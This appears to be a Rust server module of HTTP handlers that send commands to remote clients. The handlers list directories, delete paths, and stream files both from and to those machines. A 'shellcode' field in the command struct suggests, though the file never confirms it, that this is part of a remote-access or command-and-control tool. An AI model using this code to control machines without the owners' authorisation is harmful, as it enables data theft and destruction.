use crate::{
    error::{FileOperationError, ServerFileOperationResponse},
    state::AppState,
};
use axum::{
    extract::{Path, Query, State},
    http::StatusCode,
    response::Response,
    Json,
};
use bytes::Bytes;
use common::message::{
    CommandRequest, DeletePathRequest, DeletePathResponse, DownloadFileRequest, FileChunk,
    FileOperationCommand, ListDirRequest, ListDirResponse, Message, MessageType, UploadFileRequest,
    FileEntry, // 添加 FileEntry 导入
};
use futures::stream::{self, StreamExt};
use log::{error, info};
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::path::PathBuf;
use std::sync::OnceLock;
use std::time::SystemTime;
use tokio::time::Duration;
use uuid::Uuid;

const CLIENT_RESPONSE_TIMEOUT_SEC: u64 = 60;

// Static regex for permission parsing
static PERMISSION_REGEX: OnceLock<Regex> = OnceLock::new();

fn get_permission_regex() -> &'static Regex {
    PERMISSION_REGEX.get_or_init(|| {
        Regex::new(r"mode: 0o(\d+) \(([d\-rwxstST]+)\)").unwrap()
    })
}

#[derive(Debug, Deserialize)]
pub struct ListDirectoryRequest {
    pub client_id: String,
    pub path: Option<String>,
    pub recursive: Option<bool>,
}

#[derive(Debug, Deserialize)]
pub struct DeletePathPayloadWithClient {
    pub client_id: String,
    pub path: String,
}

#[derive(Debug, Deserialize)]
pub struct ClientIdQuery {
    pub client_id: String,
}

/// Helper function to send a command and await a response from the client using event-driven mechanism
async fn send_command_and_await_response_event_driven<T: Serialize>(
    state: &AppState,
    client_id: &str,
    command_type: MessageType,
    request_data: &T,
) -> Result<Message, FileOperationError> {
    // First create the message to get the ID
    let temp_command_request = CommandRequest {
        client_id: client_id.to_string(),
        command: command_type.to_string(),
        args: vec![serde_json::to_string(request_data)?],
        message_id: None,
        shellcode: None, // Add shellcode field
    };

    let message = Message::new(
        MessageType::ExecuteCommand,
        serde_json::to_vec(&temp_command_request)?,
    );
    let message_id = message.id.clone();

    // Now create the final command request with the message_id
    let command_request = CommandRequest {
        client_id: client_id.to_string(),
        command: command_type.to_string(),
        args: vec![serde_json::to_string(request_data)?],
        message_id: Some(message_id.clone()),
        shellcode: None, // Add shellcode field
    };

    // Register for event-driven response
    let response_receiver = state.register_response_notifier(message_id.clone()).await;

    // Send command to client
    state
        .client_manager
        .add_command(client_id, command_request)
        .await;

    // Wait for event-driven response with timeout
    let response_message = tokio::time::timeout(
        Duration::from_secs(CLIENT_RESPONSE_TIMEOUT_SEC),
        response_receiver,
    )
    .await
    .map_err(|_| {
        error!(
            "Client response timed out for client_id: {}, message_id: {}",
            client_id, message_id
        );
        FileOperationError::Other("Client response timed out".to_string())
    })?
    .map_err(|_| {
        error!(
            "Response channel closed for client_id: {}, message_id: {}",
            client_id, message_id
        );
        FileOperationError::Other("Response channel closed".to_string())
    })?;

    Ok(response_message)
}

/// Alias for backward compatibility - now uses event-driven mechanism
async fn send_command_and_await_response<T: Serialize>(
    state: &AppState,
    client_id: &str,
    command_type: MessageType,
    request_data: &T,
) -> Result<Message, FileOperationError> {
    send_command_and_await_response_event_driven(state, client_id, command_type, request_data).await
}

/// Parse permissions from debug string format to clean Unix format
fn parse_permissions(debug_str: &str) -> Option<String> {
    let regex = get_permission_regex();
    
    if let Some(captures) = regex.captures(debug_str) {
        if let Some(perm_str) = captures.get(2) {
            return Some(perm_str.as_str().to_string());
        }
    }
    
    // 如果正则匹配失败，尝试简单的字符串匹配
    if debug_str.contains("(") && debug_str.contains(")") {
        if let Some(start) = debug_str.find('(') {
            if let Some(end) = debug_str.find(')') {
                if start < end {
                    let perm_part = &debug_str[start + 1..end];
                    // 检查是否看起来像权限字符串
                    if perm_part.len() >= 9 && perm_part.chars().all(|c| "drwxstST-".contains(c)) {
                        return Some(perm_part.to_string());
                    }
                }
            }
        }
    }
    
    None
}

/// Enhanced file entry with parsed permissions
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EnhancedFileEntry {
    pub name: String,
    pub path: String,
    pub is_dir: bool,
    pub size: Option<u64>,
    pub modified: Option<SystemTime>,
    pub permissions: Option<String>,
    pub owner: Option<String>,
    pub group: Option<String>,
}

impl From<FileEntry> for EnhancedFileEntry {
    fn from(entry: FileEntry) -> Self {
        // 解析权限字符串
        let parsed_permissions = entry.permissions
            .as_ref()
            .and_then(|p| parse_permissions(p))
            .or(entry.permissions);

        Self {
            name: entry.name,
            path: entry.path.to_string_lossy().to_string(),
            is_dir: entry.is_dir,
            size: entry.size,
            modified: entry.modified,
            permissions: parsed_permissions,
            owner: entry.owner.clone(),
            group: entry.group.clone(),
        }
    }
}

/// API handler to list directory contents on a client.
pub async fn list_directory_handler(
    State(state): State<AppState>,
    Json(payload): Json<ListDirectoryRequest>,
) -> Result<Json<ServerFileOperationResponse>, FileOperationError> {
    let client_id = payload.client_id;
    let path_str = payload.path.unwrap_or_else(|| "/".to_string());
    let recursive = payload.recursive.unwrap_or(false);

    info!(
        "Received request to list directory on client {}: {:?}, recursive: {}",
        client_id, path_str, recursive
    );

    let list_req = ListDirRequest {
        path: path_str,
        recursive,
    };

    let response_message =
        send_command_and_await_response(&state, &client_id, MessageType::ListDir, &list_req)
            .await?;

    info!(
        "Raw payload received for ListDir: {:?}",
        String::from_utf8_lossy(&response_message.payload)
    );

    let list_res: ListDirResponse =
        serde_json::from_slice(&response_message.payload).map_err(|e| {
            error!("Failed to deserialize ListDirResponse: {}", e);
            FileOperationError::SerializationError(e.to_string())
        })?;

    info!("Deserialized ListDirResponse: {:?}", list_res);

    if list_res.success {
        // Convert FileEntry to EnhancedFileEntry with parsed permissions
        let enhanced_entries: Vec<EnhancedFileEntry> = list_res
            .entries
            .into_iter()
            .map(EnhancedFileEntry::from)
            .collect();

        let entries_json = serde_json::to_value(&enhanced_entries)?;
        Ok(Json(ServerFileOperationResponse {
            success: true,
            message: list_res.message,
            data: Some(serde_json::json!({
                "entries": entries_json
            })),
        }))
    } else {
        Err(FileOperationError::Other(list_res.message))
    }
}

/// 用于Web UI的目录列表API
pub async fn list_directory(
    State(state): State<AppState>,
    Path(client_id): Path<String>,
    Json(req): Json<ListDirRequest>,
) -> Result<Json<serde_json::Value>, (StatusCode, String)> {
    info!(
        "Received list directory request for client {}: path={}, recursive={}",
        client_id, req.path, req.recursive
    );

    // Create command request
    let cmd = CommandRequest {
        client_id: client_id.clone(),
        command: "FileOperation".to_string(),
        args: vec![serde_json::to_string(&FileOperationCommand::ListDir(req.clone()))
            .map_err(|e| {
                error!("Failed to serialize ListDirRequest: {}", e);
                (
                    StatusCode::INTERNAL_SERVER_ERROR,
                    "Failed to serialize request".to_string(),
                )
            })?],
        message_id: Some(Uuid::new_v4().to_string()),
        shellcode: None, // Add shellcode field
    };

    // Send command to client
    state.client_manager.add_command(&client_id, cmd.clone()).await;
    info!("Sent list directory command to client {}", client_id);

    // Wait for response using register_response_notifier instead
    let message_id = cmd.message_id.as_ref().unwrap();
    let response_receiver = state.register_response_notifier(message_id.clone()).await;
    
    let response_message = match tokio::time::timeout(
        Duration::from_secs(30),
        response_receiver
    ).await {
        Ok(Ok(msg)) => {
            info!("Received response for list directory request: message_id={}", msg.id);
            msg
        }
        Ok(Err(_)) => {
            error!("Response channel closed for list directory request from client {}", client_id);
            return Err((
                StatusCode::INTERNAL_SERVER_ERROR,
                "Response channel closed".to_string(),
            ));
        }
        Err(_) => {
            error!("Timeout waiting for list directory response from client {}", client_id);
            return Err((
                StatusCode::REQUEST_TIMEOUT,
                "Timeout waiting for response from client".to_string(),
            ));
        }
    };

    // Parse the response
    let payload_str = String::from_utf8(response_message.payload.clone()).map_err(|e| {
        error!("Failed to convert response payload to string: {}", e);
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            "Invalid response format".to_string(),
        )
    })?;

    info!("Raw payload received for ListDir: {:?}", payload_str);

    let response: ListDirResponse = serde_json::from_str(&payload_str).map_err(|e| {
        error!("Failed to deserialize ListDirResponse: {}", e);
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            "Failed to parse response".to_string(),
        )
    })?;

    info!("Deserialized ListDirResponse: {:?}", response);

    // Convert FileEntry to EnhancedFileEntry with parsed permissions
    let enhanced_entries: Vec<EnhancedFileEntry> = response
        .entries
        .into_iter()
        .map(EnhancedFileEntry::from)
        .collect();

    let enhanced_response = serde_json::json!({
        "entries": enhanced_entries,
        "success": response.success,
        "message": response.message
    });

    info!(
        "Successfully processed list directory request for client {}: found {} entries",
        client_id,
        enhanced_entries.len()
    );

    Ok(Json(enhanced_response))
}

pub async fn delete_path_handler(
    State(state): State<AppState>,
    Json(payload): Json<DeletePathPayloadWithClient>,
) -> Result<Json<ServerFileOperationResponse>, FileOperationError> {
    let client_id = payload.client_id;
    info!(
        "Received request to delete path on client {}: {:?}",
        client_id, payload.path
    );

    let delete_req = DeletePathRequest {
        path: payload.path.clone(),
    };

    let response_message = send_command_and_await_response(
        &state,
        &client_id,
        MessageType::DeletePath,
        &delete_req,
    )
    .await?;

    let delete_res: DeletePathResponse = serde_json::from_slice(&response_message.payload)?;

    if delete_res.success {
        Ok(Json(ServerFileOperationResponse {
            success: true,
            message: delete_res.message,
            data: None,
        }))
    } else {
        Err(FileOperationError::Other(delete_res.message))
    }
}

pub async fn download_file_handler(
    State(state): State<AppState>,
    Path(file_path): Path<String>,
    Query(query): Query<ClientIdQuery>,
) -> Result<Response, FileOperationError> {
    let client_id = query.client_id;
    info!(
        "Received request to download file {:?} from client {}",
        file_path, client_id
    );

    let download_init_req = DownloadFileRequest {
        path: file_path.clone(),
    };

    let response_message = send_command_and_await_response(
        &state,
        &client_id,
        MessageType::DownloadFileInit,
        &download_init_req,
    )
    .await?;

    let init_res: serde_json::Value = serde_json::from_slice(&response_message.payload)?;
    let file_id = init_res["file_id"]
        .as_str()
        .ok_or(FileOperationError::Other(
            "Missing file_id in download initiation response".to_string(),
        ))?
        .to_string();

    let filename = PathBuf::from(&file_path)
        .file_name()
        .unwrap_or_default()
        .to_string_lossy()
        .into_owned();

    let content_disposition = format!("attachment; filename=\"{}\"", filename);

    // Create a stream to pull chunks from the client
    let stream = stream::unfold(
        (client_id.clone(), file_id.clone(), state.clone()),
        move |(client_id, file_id, state)| async move {
            let chunk_request = serde_json::json!({"file_id": file_id});

            let response_message = match send_command_and_await_response(
                &state,
                &client_id,
                MessageType::DownloadFileChunk,
                &chunk_request,
            )
            .await
            {
                Ok(msg) => msg,
                Err(e) => return Some((Err(e), (client_id, file_id, state))),
            };

            let chunk_res: serde_json::Value =
                match serde_json::from_slice(&response_message.payload) {
                    Ok(res) => res,
                    Err(e) => {
                        error!("Failed to deserialize chunk response: {}", e);
                        return Some((
                            Err(FileOperationError::SerializationError(e.to_string())),
                            (client_id, file_id, state),
                        ));
                    }
                };

            if chunk_res["is_last"].as_bool().unwrap_or(false)
                || chunk_res["message"]
                    .as_str()
                    .unwrap_or("")
                    .contains("complete")
            {
                None
            } else if let Ok(file_chunk) = serde_json::from_value::<FileChunk>(chunk_res) {
                Some((
                    Ok(Bytes::from(file_chunk.chunk)),
                    (client_id, file_id, state),
                ))
            } else {
                error!("Invalid chunk response format");
                Some((
                    Err(FileOperationError::Other(
                        "Invalid chunk response".to_string(),
                    )),
                    (client_id, file_id, state),
                ))
            }
        },
    )
    .map(|res| res.map_err(|e| axum::Error::new(e)));

    let body = axum::body::Body::from_stream(stream);

    Ok(Response::builder()
        .status(StatusCode::OK)
        .header("Content-Type", "application/octet-stream")
        .header("Content-Disposition", content_disposition)
        .body(body)
        .map_err(|e| FileOperationError::Other(format!("Failed to build response: {}", e)))?)
}

pub async fn upload_file_handler(
    State(state): State<AppState>,
    Path(file_path): Path<String>,
    Query(query): Query<ClientIdQuery>,
    body: axum::body::Body,
) -> Result<Json<ServerFileOperationResponse>, FileOperationError> {
    let client_id = query.client_id;
    info!(
        "Received request to upload file {:?} to client {}",
        file_path, client_id
    );

    let file_id = Uuid::new_v4().to_string();

    let upload_init_req = UploadFileRequest {
        path: file_path.clone(),
        file_id: file_id.clone(),
    };

    let response_message = send_command_and_await_response(
        &state,
        &client_id,
        MessageType::UploadFileInit,
        &upload_init_req,
    )
    .await?;

    let init_res: serde_json::Value = serde_json::from_slice(&response_message.payload)?;
    if !init_res["success"].as_bool().unwrap_or(false) {
        return Err(FileOperationError::Other(format!(
            "Client failed to initiate upload: {}",
            init_res["message"].as_str().unwrap_or("unknown error")
        )));
    }

    let mut offset = 0;
    let mut data_stream = body.into_data_stream();
    let mut buffer = Vec::new();
    const BUFFER_SIZE: usize = 64 * 1024; // 64KB buffer

    while let Some(chunk_result) = data_stream.next().await {
        let chunk_bytes = chunk_result.map_err(|e| FileOperationError::IoError(e.to_string()))?;

        buffer.extend_from_slice(&chunk_bytes);

        if buffer.len() >= BUFFER_SIZE {
            let file_chunk = FileChunk {
                file_id: file_id.clone(),
                chunk: buffer.clone(),
                is_last: false,
                offset,
            };

            let response_message = send_command_and_await_response(
                &state,
                &client_id,
                MessageType::UploadFileChunk,
                &FileOperationCommand::UploadChunk(file_chunk),
            )
            .await?;

            let chunk_res: serde_json::Value = serde_json::from_slice(&response_message.payload)?;
            if !chunk_res["success"].as_bool().unwrap_or(false) {
                return Err(FileOperationError::Other(format!(
                    "Client failed to upload chunk: {}",
                    chunk_res["message"].as_str().unwrap_or("unknown error")
                )));
            }

            offset += buffer.len() as u64;
            buffer.clear();
        }
    }

    if !buffer.is_empty() {
        let chunk_len = buffer.len();
        let file_chunk = FileChunk {
            file_id: file_id.clone(),
            chunk: buffer,
            is_last: false,
            offset,
        };

        let response_message = send_command_and_await_response(
            &state,
            &client_id,
            MessageType::UploadFileChunk,
            &FileOperationCommand::UploadChunk(file_chunk),
        )
        .await?;

        let chunk_res: serde_json::Value = serde_json::from_slice(&response_message.payload)?;
        if !chunk_res["success"].as_bool().unwrap_or(false) {
            return Err(FileOperationError::Other(format!(
                "Client failed to upload chunk: {}",
                chunk_res["message"].as_str().unwrap_or("unknown error")
            )));
        }

        offset += chunk_len as u64;
    }

    // Send final chunk
    let final_chunk = FileChunk {
        file_id: file_id.clone(),
        chunk: Vec::new(),
        is_last: true,
        offset,
    };
    send_command_and_await_response(
        &state,
        &client_id,
        MessageType::UploadFileChunk,
        &final_chunk,
    )
    .await?;

    Ok(Json(ServerFileOperationResponse {
        success: true,
        message: "File uploaded successfully to client.".to_string(),
        data: None,
    }))
}
